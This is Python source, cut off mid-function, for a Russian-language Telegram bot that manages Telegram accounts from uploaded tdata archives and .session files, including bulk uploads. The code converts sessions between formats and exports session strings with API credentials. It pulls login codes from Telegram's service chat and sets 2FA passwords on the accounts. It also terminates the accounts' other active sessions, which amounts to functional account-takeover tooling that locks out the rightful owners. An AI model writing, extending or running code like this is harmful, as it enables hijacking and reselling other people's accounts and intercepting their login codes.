import asyncio

try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

import os
import json
import logging
import hashlib
import importlib.util
import re
import shutil
import sys
import tempfile
import zipfile
from datetime import datetime, timedelta
from aiogram import BaseMiddleware, Bot, Dispatcher, types, F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Библиотеки для работы с Telegram сессиями
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from pyrogram import Client as PyroClient

# Настройка логирования
logging.basicConfig(level=logging.INFO)

# --- КОНФИГУРАЦИЯ ---
CONFIG_FILE = "config.local.json"
OWNER_ID = 8700330523

def load_config():
    config = {}
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r", encoding="utf-8") as file:
            config.update(json.load(file))

    return {
        "api_id": int(os.getenv("API_ID") or config.get("api_id", 0)),
        "api_hash": os.getenv("API_HASH") or config.get("api_hash", ""),
        "bot_token": os.getenv("BOT_TOKEN") or config.get("bot_token", ""),
        "owner_id": int(os.getenv("OWNER_ID") or config.get("owner_id", OWNER_ID)),
    }

CONFIG = load_config()
API_ID = CONFIG["api_id"]
API_HASH = CONFIG["api_hash"]
BOT_TOKEN = CONFIG["bot_token"]
OWNER_ID = CONFIG["owner_id"]
SESSION_DIR = "sessions"
ADMINS_FILE = "admins.json"
HISTORY_FILE = os.path.join(SESSION_DIR, "accounts.json")
BATCH_FILE = os.path.join(SESSION_DIR, "bulk_batches.json")
CODE_PATTERN = re.compile(r"\b\d{5,6}\b")
TELEGRAM_TEXT_LIMIT = 3900
SESSIONS_PER_PAGE = 7

if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

if not BOT_TOKEN or not API_ID or not API_HASH:
    raise RuntimeError("Заполните BOT_TOKEN, API_ID и API_HASH в config.local.json или переменных окружения.")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- СОСТОЯНИЯ ---
class SessionStates(StatesGroup):
    waiting_for_file = State()
    waiting_for_bulk_tdata = State()
    waiting_for_bulk_sessions = State()
    waiting_for_json = State()
    waiting_for_2fa = State()
    waiting_for_admin_id = State()
    waiting_for_admin_days = State()

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def sanitize_filename(value: str) -> str:
    return "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in value)

def get_session_type(session_name: str) -> str:
    if session_name.startswith("tdata_"):
        return "tdata"
    if "telethon" in session_name or "json" in session_name or session_name.startswith("converted_"):
        return "telethon"
    return "pyrogram"

def get_pyrogram_session_name(session_path: str) -> str:
    return os.path.splitext(os.path.basename(session_path))[0]

def list_saved_accounts():
    accounts = [f for f in os.listdir(SESSION_DIR) if f.endswith(".session")]
    accounts.extend(
        f for f in os.listdir(SESSION_DIR)
        if f.startswith("tdata_") and os.path.isdir(os.path.join(SESSION_DIR, f))
    )
    return sorted(accounts)

def account_key(session_name: str) -> str:
    return hashlib.sha1(session_name.encode("utf-8")).hexdigest()[:12]

def resolve_account_key(key: str) -> str | None:
    for session_name in list_saved_accounts():
        if account_key(session_name) == key:
            return session_name
    return None

def sync_history_with_files():
    history = load_history()
    existing = set(list_saved_accounts())

    for session_name in existing:
        if session_name not in history:
            history[session_name] = {
                "type": get_session_type(session_name),
                "status": "active",
                "added_at": "раньше запуска истории",
                "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }

    for session_name in list(history):
        if session_name not in existing:
            history.pop(session_name, None)

    save_history(history)

def load_history():
    if not os.path.exists(HISTORY_FILE):
        return {}

    try:
        with open(HISTORY_FILE, "r", encoding="utf-8") as file:
            return json.load(file)
    except (json.JSONDecodeError, OSError):
        return {}

def save_history(history: dict):
    with open(HISTORY_FILE, "w", encoding="utf-8") as file:
        json.dump(history, file, ensure_ascii=False, indent=2)

def load_batches():
    if not os.path.exists(BATCH_FILE):
        return {}

    try:
        with open(BATCH_FILE, "r", encoding="utf-8") as file:
            return json.load(file)
    except (json.JSONDecodeError, OSError):
        return {}

def save_batches(batches: dict):
    with open(BATCH_FILE, "w", encoding="utf-8") as file:
        json.dump(batches, file, ensure_ascii=False, indent=2)

def load_admins():
    if not os.path.exists(ADMINS_FILE):
        return []

    try:
        with open(ADMINS_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)
            admins = data.get("admins", [])
            if admins and isinstance(admins[0], int):
                return [
                    {
                        "id": int(admin_id),
                        "expires_at": None,
                        "added_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    }
                    for admin_id in admins
                ]

            return [
                {
                    "id": int(item["id"]),
                    "expires_at": item.get("expires_at"),
                    "added_at": item.get("added_at") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                for item in admins
                if int(item.get("id", 0)) != OWNER_ID
            ]
    except (json.JSONDecodeError, OSError, ValueError):
        return []

def save_admins(admins: list[dict]):
    clean_admins = []
    seen = set()
    for item in admins:
        admin_id = int(item["id"])
        if admin_id == OWNER_ID or admin_id in seen:
            continue
        seen.add(admin_id)
        clean_admins.append({
            "id": admin_id,
            "expires_at": item.get("expires_at"),
            "added_at": item.get("added_at") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })
    clean_admins.sort(key=lambda item: item["id"])
    with open(ADMINS_FILE, "w", encoding="utf-8") as file:
        json.dump({"admins": clean_admins}, file, ensure_ascii=False, indent=2)

def parse_admin_expire(expires_at: str | None):
    if not expires_at:
        return None
    return datetime.strptime(expires_at, "%Y-%m-%d %H:%M:%S")

def is_admin_active(admin: dict):
    expires_at = parse_admin_expire(admin.get("expires_at"))
    return expires_at is None or expires_at > datetime.now()

def cleanup_expired_admins():
    admins = load_admins()
    active_admins = [admin for admin in admins if is_admin_active(admin)]
    if len(active_admins) != len(admins):
        save_admins(active_admins)
    return active_admins

def get_admin_label(admin: dict):
    expires_at = admin.get("expires_at")
    if expires_at:
        return f"{admin['id']} | до {expires_at}"
    return f"{admin['id']} | навсегда"

def build_admin_entry(admin_id: int, days: int):
    expires_at = None
    if days > 0:
        expires_at = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    return {
        "id": int(admin_id),
        "expires_at": expires_at,
        "added_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

def is_owner(user_id: int | None):
    return user_id == OWNER_ID

def is_admin(user_id: int | None):
    if user_id is None:
        return False
    return is_owner(user_id) or any(admin["id"] == int(user_id) for admin in cleanup_expired_admins())

class AccessMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        user = data.get("event_from_user")
        user_id = user.id if user else None

        if is_admin(user_id):
            return await handler(event, data)

        if isinstance(event, types.CallbackQuery):
            await event.answer("Нет доступа", show_alert=True)
            return None

        if isinstance(event, types.Message):
            await event.answer("Нет доступа. Обратитесь к владельцу бота.")
            return None

        return None

router.message.middleware(AccessMiddleware())
router.callback_query.middleware(AccessMiddleware())

def update_history(session_name: str, account_info: dict | None = None, status: str = "active"):
    history = load_history()
    current = history.get(session_name, {})
    current.update({
        "type": get_session_type(session_name),
        "status": status,
        "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    })

    if "added_at" not in current:
        current["added_at"] = current["updated_at"]

    if account_info:
        current.update(account_info)
        current.pop("last_error", None)

    history[session_name] = current
    save_history(history)

def remove_from_history(session_name: str):
    history = load_history()
    if session_name in history:
        history.pop(session_name)
        save_history(history)

def format_account_label(session_name: str) -> str:
    info = load_history().get(session_name, {})
    account_type = info.get("type") or get_session_type(session_name)
    added_at = info.get("added_at", "дата неизвестна").split(" ")[0]
    source_name = info.get("source_base") or session_name
    return f"{source_name} | {account_type} | {added_at}"

def format_account_details(session_name: str) -> str:
    info = load_history().get(session_name, {})
    lines = [
        f"Аккаунт: {session_name}",
        f"Тип: {info.get('type') or get_session_type(session_name)}",
        f"Номер: {info.get('phone') or 'не удалось определить'}",
        f"ID: {info.get('user_id') or 'не удалось определить'}",
    ]

    name = " ".join(part for part in (info.get("first_name"), info.get("last_name")) if part)
    if name:
        lines.append(f"Имя: {name}")
    if info.get("username"):
        lines.append(f"Username: @{info['username']}")
    if info.get("added_at"):
        lines.append(f"Добавлена: {info['added_at']}")
    if info.get("last_code_at"):
        lines.append(f"Код проверен: {info['last_code_at']}")

    return "\n".join(lines)

def derive_tdata_source_base(tdata_name: str) -> str:
    info = load_history().get(tdata_name, {})
    if info.get("source_base"):
        return sanitize_filename(info["source_base"])

    parts = tdata_name.split("_")
    if len(parts) >= 7 and parts[0] == "tdata" and parts[2] == "bulk":
        return sanitize_filename("_".join(parts[6:]))
    if len(parts) >= 3 and parts[0] == "tdata":
        return sanitize_filename("_".join(parts[2:]))
    return sanitize_filename(tdata_name)

def make_output_path(base_name: str, extension: str):
    safe_base = sanitize_filename(base_name) or "converted"
    file_name = f"{safe_base}.{extension}"
    return file_name, os.path.join(SESSION_DIR, file_name)

def zip_tdata_dir(tdata_dir: str, zip_path: str):
    if os.path.exists(zip_path):
        os.remove(zip_path)

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
        for root, _, files in os.walk(tdata_dir):
            for file_name in files:
                full_path = os.path.join(root, file_name)
                relative_path = os.path.relpath(full_path, tdata_dir)
                archive.write(full_path, os.path.join("tdata", relative_path))

def delete_local_account(session_name: str):
    path = os.path.join(SESSION_DIR, session_name)
    if os.path.isdir(path):
        shutil.rmtree(path)
    elif os.path.exists(path):
        os.remove(path)
    remove_from_history(session_name)

def safe_extract_zip(zip_path: str, destination: str):
    destination_abs = os.path.abspath(destination)
    with zipfile.ZipFile(zip_path) as archive:
        for member in archive.infolist():
            member_path = os.path.abspath(os.path.join(destination, member.filename))
            if not member_path.startswith(destination_abs + os.sep):
                raise ValueError("Архив содержит небезопасные пути.")
        archive.extractall(destination)

def find_tdata_path(root_path: str):
    if os.path.exists(os.path.join(root_path, "key_datas")):
        return root_path

    for current_root, _, files in os.walk(root_path):
        if "key_datas" in files:
            return current_root

    return None

async def save_tdata_document(message: types.Message, tdata_name: str):
    target_dir = os.path.join(SESSION_DIR, tdata_name)
    zip_path = os.path.join(SESSION_DIR, f"{tdata_name}.zip")
    extract_dir = os.path.join(SESSION_DIR, f"{tdata_name}_extract")

    file = await bot.get_file(message.document.file_id)
    await bot.download_file(file.file_path, zip_path)

    try:
        if os.path.exists(target_dir):
            shutil.rmtree(target_dir)
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)

        os.makedirs(extract_dir, exist_ok=True)
        safe_extract_zip(zip_path, extract_dir)
        found_tdata = find_tdata_path(extract_dir)
        if not found_tdata:
            raise ValueError("В архиве не найден файл key_datas.")

        shutil.copytree(found_tdata, target_dir)
        return target_dir
    finally:
        if os.path.exists(zip_path):
            os.remove(zip_path)
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)

def patch_opentele_python314():
    spec = importlib.util.find_spec("opentele")
    if not spec or not spec.origin:
        return False

    utils_path = os.path.join(os.path.dirname(spec.origin), "utils.py")
    if not os.path.exists(utils_path):
        return False

    with open(utils_path, "r", encoding="utf-8") as file:
        content = file.read()

    patched = content
    for attr in ("__firstlineno__", "__static_attributes__"):
        if attr not in patched:
            patched = patched.replace('"__doc__"', f'"__doc__",\n            "{attr}"')

    if patched == content:
        return True

    with open(utils_path, "w", encoding="utf-8") as file:
        file.write(patched)
    return True

def load_opentele():
    try:
        from opentele.api import UseCurrentSession
        from opentele.td import TDesktop
        return TDesktop, UseCurrentSession
    except ImportError as e:
        raise RuntimeError(f"Установите зависимости: pip install -r requirements.txt ({e})")
    except BaseException as e:
        if sys.version_info < (3, 14) or not patch_opentele_python314():
            raise RuntimeError(f"opentele не загрузился: {e}")

        for module_name in list(sys.modules):
            if module_name == "opentele" or module_name.startswith("opentele."):
                sys.modules.pop(module_name, None)

        try:
            from opentele.api import UseCurrentSession
            from opentele.td import TDesktop
            return TDesktop, UseCurrentSession
        except BaseException as retry_error:
            raise RuntimeError(f"opentele не загрузился после патча совместимости: {retry_error}")

async def convert_tdata_to_session(tdata_path: str, output_session_path: str, verify: bool = False):
    TDesktop, UseCurrentSession = load_opentele()

    tdesk = TDesktop(tdata_path)
    if not tdesk.isLoaded():
        raise RuntimeError("Не удалось прочитать tdata. Проверьте, что архив содержит рабочую папку tdata.")

    client = await tdesk.ToTelethon(session=output_session_path, flag=UseCurrentSession)
    client.session.save()

    if not verify:
        return output_session_path

    try:
        await client.connect()
        if not await client.is_user_authorized():
            raise RuntimeError("tdata не авторизована или сессия недействительна.")
    finally:
        await client.disconnect()

    return output_session_path

def build_account_info(user) -> dict:
    phone = getattr(user, "phone_number", None) or getattr(user, "phone", None)
    if phone and not str(phone).startswith("+"):
        phone = f"+{phone}"

    return {
        "user_id": getattr(user, "id", None),
        "phone": phone,
        "first_name": getattr(user, "first_name", None),
        "last_name": getattr(user, "last_name", None),
        "username": getattr(user, "username", None),
    }

async def get_account_info(session_path: str, lib_type: str = "telethon") -> dict:
    if lib_type == "telethon":
        async with TelegramClient(session_path, API_ID, API_HASH) as client:
            if not await client.is_user_authorized():
                raise RuntimeError("сессия не авторизована")
            return build_account_info(await client.get_me())

    if lib_type == "pyrogram":
        async with PyroClient(get_pyrogram_session_name(session_path), api_id=API_ID, api_hash=API_HASH, workdir=SESSION_DIR) as app:
            return build_account_info(await app.get_me())

    if lib_type == "tdata":
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_session = os.path.join(temp_dir, "tdata_info.session")
            await convert_tdata_to_session(session_path, temp_session)
            return await get_account_info(temp_session, "telethon")

    raise RuntimeError(f"неизвестный тип сессии: {lib_type}")

async def export_session_json(session_path: str, json_path: str, account_info: dict | None = None):
    client = TelegramClient(session_path, API_ID, API_HASH)
    account_info = account_info or {}
    payload = {
        "type": "telethon",
        "api_id": API_ID,
        "api_hash": API_HASH,
        "session_file": os.path.basename(session_path),
        "session_string": StringSession.save(client.session),
        "user_id": account_info.get("user_id"),
        "phone": account_info.get("phone"),
        "first_name": account_info.get("first_name"),
        "last_name": account_info.get("last_name"),
        "username": account_info.get("username"),
        "exported_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "note": "Экспорт создан без подключения к аккаунту.",
    }

    with open(json_path, "w", encoding="utf-8") as file:
        json.dump(payload, file, ensure_ascii=False, indent=2)

    return json_path

async def convert_tdata_account(tdata_name: str):
    tdata_path = os.path.join(SESSION_DIR, tdata_name)
    output_base = derive_tdata_source_base(tdata_name)
    output_name, output_path = make_output_path(output_base, "session")
    json_name, json_path = make_output_path(output_base, "json")

    await convert_tdata_to_session(tdata_path, output_path, verify=False)
    info = load_history().get(tdata_name, {})
    update_history(output_name, info if info else None)
    await export_session_json(output_path, json_path, info)

    return {
        "tdata_name": tdata_name,
        "session_name": output_name,
        "session_path": output_path,
        "json_name": json_name,
        "json_path": json_path,
        "phone": info.get("phone") if info else None,
        "user_id": info.get("user_id") if info else None,
    }

async def convert_session_to_tdata(session_name: str):
    TDesktop, UseCurrentSession = load_opentele()
    info = load_history().get(session_name, {})
    user_id = info.get("user_id")
    if not user_id:
        raise RuntimeError("Для пассивной обратной конвертации нужен user_id в истории. Нажмите 'Обновить номер', потом повторите.")

    base_name = sanitize_filename(info.get("source_base") or os.path.splitext(os.path.basename(session_name))[0])
    session_path = os.path.join(SESSION_DIR, session_name)
    tdata_dir_name = f"{base_name}_tdata"
    tdata_dir = os.path.join(SESSION_DIR, tdata_dir_name)
    zip_name = f"{tdata_dir_name}.zip"
    zip_path = os.path.join(SESSION_DIR, zip_name)

    if os.path.exists(tdata_dir):
        shutil.rmtree(tdata_dir)

    client = TelegramClient(session_path, API_ID, API_HASH)
    client.UserId = int(user_id)
    tdesk = await TDesktop.FromTelethon(client, flag=UseCurrentSession)
    tdesk.SaveTData(tdata_dir)
    zip_tdata_dir(tdata_dir, zip_path)

    return {
        "zip_name": zip_name,
        "zip_path": zip_path,
        "tdata_dir": tdata_dir,
        "phone": info.get("phone"),
        "user_id": user_id,
    }

async def convert_session_account_to_tdata(session_name: str):
    history = load_history()
    current = history.get(session_name, {})

    if not current.get("user_id"):
        info = await get_account_info(os.path.join(SESSION_DIR, session_name), "telethon")
        info["source_base"] = current.get("source_base") or os.path.splitext(os.path.basename(session_name))[0]
        update_history(session_name, info)

    result = await convert_session_to_tdata(session_name)
    result["session_name"] = session_name
    return result

async def remember_account(session_name: str):
    path = os.path.join(SESSION_DIR, session_name)
    try:
        info = await get_account_info(path, get_session_type(session_name))
        update_history(session_name, info)
        return info
    except Exception as e:
        update_history(session_name, {"last_error": str(e)})
        logging.warning("Не удалось определить аккаунт для %s: %s", session_name, e)
        return None

def extract_code_from_text(text: str | None):
    if not text:
        return None

    match = CODE_PATTERN.search(text)
    return match.group(0) if match else None

def trim_telegram_text(text: str, limit: int = TELEGRAM_TEXT_LIMIT) -> str:
    if len(text) <= limit:
        return text
    return f"{text[:limit - 20]}\n\n...текст обрезан"

async def get_last_code(session_path, lib_type="telethon"):
    """Получает последний код из чата 777000"""
    try:
        if lib_type == "telethon":
            async with TelegramClient(session_path, API_ID, API_HASH) as client:
                if not await client.is_user_authorized():
                    return "Сессия не авторизована."

                last_text = None
                async for message in client.iter_messages(777000, limit=10):
                    if message.text and not last_text:
                        last_text = message.text
                    code = extract_code_from_text(message.text)
                    if code:
                        return trim_telegram_text(f"Код: {code}\n\nСообщение:\n{message.text}")
                if last_text:
                    return trim_telegram_text(f"Код не найден, последнее сообщение:\n{last_text}")
        elif lib_type == "pyrogram":
            async with PyroClient(get_pyrogram_session_name(session_path), api_id=API_ID, api_hash=API_HASH, workdir=SESSION_DIR) as app:
                last_text = None
                async for message in app.get_chat_history(777000, limit=10):
                    if message.text and not last_text:
                        last_text = message.text
                    code = extract_code_from_text(message.text)
                    if code:
                        return trim_telegram_text(f"Код: {code}\n\nСообщение:\n{message.text}")
                if last_text:
                    return trim_telegram_text(f"Код не найден, последнее сообщение:\n{last_text}")
        elif lib_type == "tdata":
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_session = os.path.join(temp_dir, "tdata_check.session")
                await convert_tdata_to_session(session_path, temp_session)
                return await get_last_code(temp_session, "telethon")
    except Exception as e:
        return f"Ошибка при получении кода: {str(e)}"
    return "Сообщений от Telegram не найдено."

async def set_cloud_password(session_path, password, lib_type="telethon"):
    """Установка 2FA"""
    try:
        if lib_type == "telethon":
            async with TelegramClient(session_path, API_ID, API_HASH) as client:
                await client.edit_2fa(new_password=password)
        elif lib_type == "pyrogram":
            async with PyroClient(get_pyrogram_session_name(session_path), api_id=API_ID, api_hash=API_HASH, workdir=SESSION_DIR) as app:
                await app.enable_cloud_password(password)
        return True
    except Exception as e:
        logging.error(f"2FA Error: {e}")
        return False

def authorization_timestamp(auth):
    date_active = getattr(auth, "date_active", None)
    date_created = getattr(auth, "date_created", None)
    return date_active or date_created or datetime.min

async def terminate_old_authorizations_keep_latest(session_path: str):
    async with TelegramClient(session_path, API_ID, API_HASH) as client:
        if not await client.is_user_authorized():
            raise RuntimeError("сессия чекера не авторизована")

        result = await client(functions.account.GetAuthorizationsRequest())
        authorizations = result.authorizations
        other_authorizations = [auth for auth in authorizations if not getattr(auth, "current", False)]
        keep_auth = max(other_authorizations, key=authorization_timestamp) if other_authorizations else None

        terminated_old = 0
        for auth in other_authorizations:
            if keep_auth and auth.hash == keep_auth.hash:
                continue
            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
            terminated_old += 1

        await client.log_out()

    return {
        "kept": {
            "app_name": getattr(keep_auth, "app_name", None),
            "device_model": getattr(keep_auth, "device_model", None),
            "date_active": str(getattr(keep_auth, "date_active", "")),
        } if keep_auth else None,
        "terminated_old": terminated_old,
        "checker_logged_out": True,
    }

# --- ХЭНДЛЕРЫ ---

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Добавить сессию", callback_data="add_session"))
    builder.row(types.InlineKeyboardButton(text="Список сессий", callback_data="list_sessions"))
    
    await message.answer("Менеджер сессий готов к работе.\nВыберите действие:", reply_markup=builder.as_markup())

@router.message(Command("admins"))
async def cmd_admins(message: types.Message):
    if not is_owner(message.from_user.id):
        await message.answer("Команда доступна только владельцу.")
        return

    await show_admins_menu(message)

async def show_admins_menu(message: types.Message, is_edit: bool = False):
    admins = cleanup_expired_admins()
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Добавить админа", callback_data="admin_add"))
    if admins:
        builder.row(types.InlineKeyboardButton(text="Удалить админа", callback_data="admin_remove_menu"))
    builder.row(types.InlineKeyboardButton(text="В меню", callback_data="back_to_main"))

    lines = [f"Владелец: {OWNER_ID}", "", "Админы:"]
    if admins:
        lines.extend(get_admin_label(admin) for admin in admins)
    else:
        lines.append("пока нет")

    text = "\n".join(lines)
    if is_edit:
        await message.edit_text(text, reply_markup=builder.as_markup())
    else:
        await message.answer(text, reply_markup=builder.as_markup())

@router.callback_query(F.data == "admin_add")
async def action_admin_add(callback: types.CallbackQuery, state: FSMContext):
    if not is_owner(callback.from_user.id):
        await callback.answer("Только владелец", show_alert=True)
        return

    await state.set_state(SessionStates.waiting_for_admin_id)
    await callback.message.answer("Отправьте Telegram ID нового админа.")
    await callback.answer()

@router.message(SessionStates.waiting_for_admin_id)
async def process_admin_id(message: types.Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        await message.answer("Только владелец может добавлять админов.")
        await state.clear()
        return

    try:
        admin_id = int(message.text.strip())
    except (ValueError, AttributeError):
        await message.answer("Отправьте числовой Telegram ID.")
        return

    if admin_id == OWNER_ID:
        await message.answer("Этот ID уже владелец.")
        await state.clear()
        await show_admins_menu(message)
        return

    await state.update_data(new_admin_id=admin_id)
    await state.set_state(SessionStates.waiting_for_admin_days)
    await message.answer("На сколько дней выдать доступ? Отправьте число. 0 значит навсегда.")

@router.message(SessionStates.waiting_for_admin_days)
async def process_admin_days(message: types.Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        await message.answer("Только владелец может добавлять админов.")
        await state.clear()
        return

    try:
        days = int(message.text.strip())
    except (ValueError, AttributeError):
        await message.answer("Отправьте число дней. 0 значит навсегда.")
        return

    if days < 0:
        await message.answer("Срок не может быть отрицательным. 0 значит навсегда.")
        return

    data = await state.get_data()
    admin_id = int(data["new_admin_id"])
    admins = [admin for admin in cleanup_expired_admins() if admin["id"] != admin_id]
    entry = build_admin_entry(admin_id, days)
    admins.append(entry)
    save_admins(admins)

    await state.clear()
    await message.answer(f"Админ добавлен: {get_admin_label(entry)}")
    await show_admins_menu(message)

@router.callback_query(F.data == "admin_remove_menu")
async def action_admin_remove_menu(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        await callback.answer("Только владелец", show_alert=True)
        return

    admins = cleanup_expired_admins()
    builder = InlineKeyboardBuilder()
    for admin in admins:
        builder.row(types.InlineKeyboardButton(text=get_admin_label(admin), callback_data=f"admin_remove:{admin['id']}"))
    builder.row(types.InlineKeyboardButton(text="Назад", callback_data="admins_menu"))
    await callback.message.edit_text("Выберите админа для удаления:", reply_markup=builder.as_markup())

@router.callback_query(F.data.startswith("admin_remove:"))
async def action_admin_remove(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        await callback.answer("Только владелец", show_alert=True)
        return

    admin_id = int(callback.data.split(":")[1])
    admins = [item for item in cleanup_expired_admins() if item["id"] != admin_id]
    save_admins(admins)
    await callback.answer("Админ удален")
    await show_admins_menu(callback.message, is_edit=True)

@router.callback_query(F.data == "admins_menu")
async def action_admins_menu(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        await callback.answer("Только владелец", show_alert=True)
        return
    await show_admins_menu(callback.message, is_edit=True)

@router.callback_query(F.data == "add_session")
async def add_session_menu(callback: types.CallbackQuery):
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Telethon (.session)", callback_data="add_type_telethon"))
    builder.row(types.InlineKeyboardButton(text="Pyrogram (.session)", callback_data="add_type_pyrogram"))
    builder.row(types.InlineKeyboardButton(text="Telegram Desktop tdata (.zip)", callback_data="add_type_tdata"))
    builder.row(types.InlineKeyboardButton(text="Массовая tdata (.zip)", callback_data="add_type_bulk_tdata"))
    builder.row(types.InlineKeyboardButton(text="Массовые Telethon (.session)", callback_data="add_type_bulk_sessions"))
    builder.row(types.InlineKeyboardButton(text="JSON / String", callback_data="add_type_json"))
    builder.row(types.InlineKeyboardButton(text="Назад", callback_data="back_to_main"))
    
    await callback.message.edit_text("Выберите тип добавляемой сессии:", reply_markup=builder.as_markup())

@router.callback_query(F.data.startswith("add_type_"))
async def process_add_type(callback: types.CallbackQuery, state: FSMContext):
    session_type = callback.data.removeprefix("add_type_")
    await state.update_data(current_type=session_type)
    
    if session_type == "json":
        await callback.message.answer("Отправьте JSON строку или Session String:")
        await state.set_state(SessionStates.waiting_for_json)
    elif session_type == "bulk_tdata":
        batch_id = f"bulk_{callback.from_user.id}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        await state.update_data(
            batch_id=batch_id,
            bulk_items=[],
            bulk_errors=[],
            created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        builder = InlineKeyboardBuilder()
        builder.row(types.InlineKeyboardButton(text="Анализ и конвертация", callback_data=f"finish_bulk:{batch_id}"))
        builder.row(types.InlineKeyboardButton(text="Отмена", callback_data="back_to_main"))
        await callback.message.answer(
            "Кидайте zip-архивы tdata по одному или пачкой файлов. Когда закончите, нажмите анализ и конвертацию.",
            reply_markup=builder.as_markup()
        )
        await state.set_state(SessionStates.waiting_for_bulk_tdata)
    elif session_type == "bulk_sessions":
        batch_id = f"bulk_sessions_{callback.from_user.id}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        await state.update_data(
            batch_id=batch_id,
            bulk_items=[],
            bulk_errors=[],
            created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        builder = InlineKeyboardBuilder()
        builder.row(types.InlineKeyboardButton(text="Анализ и конвертация", callback_data=f"finish_bulk_sessions:{batch_id}"))
        builder.row(types.InlineKeyboardButton(text="Отмена", callback_data="back_to_main"))
        await callback.message.answer(
            "Кидайте Telethon .session файлы. После загрузки нажмите анализ и конвертацию.",
            reply_markup=builder.as_markup()
        )
        await state.set_state(SessionStates.waiting_for_bulk_sessions)
    elif session_type == "tdata":
        await callback.message.answer("Отправьте .zip архив с папкой tdata или ее содержимым:")
        await state.set_state(SessionStates.waiting_for_file)
    else:
        await callback.message.answer(f"Отправьте файл .session для {session_type.capitalize()}:")
        await state.set_state(SessionStates.waiting_for_file)
    await callback.answer()

@router.message(SessionStates.waiting_for_file, F.document)
async def handle_session_file(message: types.Message, state: FSMContext):
    data = await state.get_data()
    lib_type = data.get("current_type")

    if lib_type == "tdata":
        if not message.document.file_name.lower().endswith(".zip"):
            await message.answer("Ошибка: для tdata отправьте архив .zip.")
            return

        safe_name = sanitize_filename(message.document.file_name.rsplit(".", 1)[0])
        tdata_name = f"tdata_{message.from_user.id}_{safe_name}"

        try:
            await save_tdata_document(message, tdata_name)
        except Exception as e:
            await message.answer(f"Ошибка: не удалось загрузить tdata: {e}")
            return

        await state.clear()
        update_history(tdata_name, {"source_base": safe_name})
        await message.answer(f"Готово: tdata {tdata_name} успешно загружена.")
        await message.answer("Номер не проверялся: tdata добавлена без подключения к аккаунту.")
        await show_session_menu(message, tdata_name)
        return
    
    file_name = f"{lib_type}_{message.document.file_name}"
    file_path = os.path.join(SESSION_DIR, file_name)
    
    file = await bot.get_file(message.document.file_id)
    await bot.download_file(file.file_path, file_path)
    
    await state.clear()
    await message.answer("Проверяю сессию и определяю номер...")
    info = await remember_account(file_name)
    phone = info.get("phone") if info else "номер не удалось определить"
    await message.answer(f"Готово: сессия {file_name} успешно загружена.")
    await message.answer(f"Номер: {phone}")
    await show_session_menu(message, file_name)

@router.message(SessionStates.waiting_for_bulk_tdata, F.document)
async def handle_bulk_tdata_file(message: types.Message, state: FSMContext):
    data = await state.get_data()
    batch_id = data.get("batch_id")
    items = data.get("bulk_items", [])
    errors = data.get("bulk_errors", [])

    if not message.document.file_name.lower().endswith(".zip"):
        errors.append({
            "file": message.document.file_name,
            "error": "не zip-архив",
        })
        await state.update_data(bulk_errors=errors)
        await message.answer("Пропустил файл: для tdata нужен .zip")
        return

    safe_name = sanitize_filename(message.document.file_name.rsplit(".", 1)[0])
    tdata_name = f"tdata_{message.from_user.id}_{batch_id}_{len(items) + 1}_{safe_name}"

    try:
        await save_tdata_document(message, tdata_name)
        update_history(tdata_name, {"source_base": safe_name})
        items.append(tdata_name)
        await state.update_data(bulk_items=items)
    except Exception as e:
        errors.append({
            "file": message.document.file_name,
            "error": str(e),
        })
        await state.update_data(bulk_errors=errors)
        await message.answer(f"Не удалось добавить {message.document.file_name}: {e}")
        return

    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Анализ и конвертация", callback_data=f"finish_bulk:{batch_id}"))
    builder.row(types.InlineKeyboardButton(text="Отмена", callback_data="back_to_main"))
    await message.answer(
        f"Добавлено в пачку: {len(items)}\nОшибок при загрузке: {len(errors)}",
        reply_markup=builder.as_markup()
    )

@router.message(SessionStates.waiting_for_bulk_sessions, F.document)
async def handle_bulk_session_file(message: types.Message, state: FSMContext):
    data = await state.get_data()
    batch_id = data.get("batch_id")
    items = data.get("bulk_items", [])
    errors = data.get("bulk_errors", [])
    original_name = message.document.file_name

    if not original_name.lower().endswith(".session"):
        errors.append({"file": original_name, "error": "не .session файл"})
        await state.update_data(bulk_errors=errors)
